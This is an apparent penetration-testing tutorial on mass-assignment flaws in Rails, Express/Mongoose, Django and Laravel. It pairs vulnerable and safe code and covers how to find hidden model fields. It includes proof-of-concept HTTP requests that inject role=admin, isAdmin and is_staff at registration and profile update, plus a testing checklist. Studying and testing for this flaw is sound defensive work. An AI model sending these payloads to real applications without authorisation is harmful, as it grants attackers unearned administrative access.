Mass Assignment
Mass assignment is what happens when a framework auto-binds HTTP parameters to model attributes and the developer doesn't explicitly whitelist which attributes are allowed to be set. You register as a normal user and include role=admin in the request body. The framework happily assigns it. You're now an admin.
The name comes from Rails, but the pattern exists everywhere  -  Express/Mongoose, Django, Laravel, Spring. The underlying problem is convenience features that bind entire request bodies to data objects without filtering.
How It Works per Framework
Ruby on Rails
Classic Rails: User.new(params[:user]) or @user.update(params[:user])  -  anything in the user params hash gets assigned.
Modern Rails requires params.require(:user).permit(:name, :email, :password)  -  anything not in permit() is stripped. The vulnerability exists when permit! (permits everything) is used, when the whitelist is too broad, or in old pre-4.0 code.
POST /register HTTP/1.1
Content-Type: application/json
 
{"user": {"name": "Attacker", "email": "x@x.com", "password": "pass", "role": "admin"}}
Also test: is_admin, admin, verified, confirmed, plan, account_type.
Node.js / Express + Mongoose
Mongoose schemas define allowed fields, but req.body → document update without schema filtering is the hole:
// Vulnerable
User.findByIdAndUpdate(req.params.id, req.body);
 
// Safe
User.findByIdAndUpdate(req.params.id, {
  name: req.body.name,
  email: req.body.email
});
Test by injecting fields that exist on the model but shouldn't be user-settable:
PUT /api/user/profile HTTP/1.1
{"name": "Attacker", "role": "admin", "isVerified": true, "subscription": "enterprise"}
Django
Django REST Framework serializers with fields = '__all__' are the culprit:
class UserSerializer(serializers.ModelSerializer):
    class Meta:
        model = User
        fields = '__all__'  # <-- every model field is writable
Test fields that exist on the User model: is_staff, is_superuser, groups, user_permissions.
Laravel / PHP
// Vulnerable
$user->fill($request->all());
 
// Protected
$user->fill($request->only(['name', 'email']));
Also check $fillable vs $guarded model properties  -  $guarded = [] means nothing is protected.
Finding Hidden Parameters
The fields you can set aren't always visible in the UI or default request body. Find them by:
JS Bundle Analysis
Search minified JS for field names that correspond to model attributes:
# Download and search JS bundles
curl -s target.com/app.js | grep -oE '"[a-z_]+":\s*' | sort -u | head -50
# Look for: role, isAdmin, plan, verified, creditBalance, subscriptionTier
API Documentation
If the app has Swagger/OpenAPI docs (/api/docs, /swagger.json, /openapi.yaml), check the schema definitions  -  they list every field on every model.
Response Analysis
The response to a GET request on your own profile shows you what fields the model has. Any field in the response that you can't set through the UI is a candidate for mass assignment:
GET /api/user/me
{
  "id": 42,
  "name": "Attacker",
  "email": "x@x.com",
  "role": "user",          ← try setting this
  "isVerified": false,     ← try setting this
  "plan": "free",          ← try setting this
  "createdAt": "..."
}
Error Messages
Send unexpected fields and look at validation errors  -  some apps tell you which fields are valid:
POST /register
{"role": "admin"}
→ "role is not a permitted parameter"  ← field exists but is guarded
→ 422 with field errors listing valid fields
PoC: Registration to Admin
POST /api/auth/register HTTP/1.1
Content-Type: application/json
 
{
  "name": "Test",
  "email": "attacker@evil.com",
  "password": "Password1!",
  "role": "admin",
  "isAdmin": true,
  "is_staff": true,
  "account_type": "admin",
  "plan": "enterprise",
  "isVerified": true
}
Then log in and check your profile/permissions. Also try via profile update:
PUT /api/user/profile HTTP/1.1
Cookie: session=YOUR_SESSION
 
{"role": "admin"}
Checklist

 Extract all user-related fields from GET /api/user/me response
 Search JS bundles for model field names
 Check API docs for schema definitions
 Test adding role, is_admin, isAdmin, admin, plan, verified, isVerified to registration
 Test the same fields on profile update endpoints
 Try nested objects: {"user": {"role": "admin"}}
 Check if array fields can be assigned: {"groups": ["admin"]}
 Look for $guarded = [] patterns in any exposed framework config
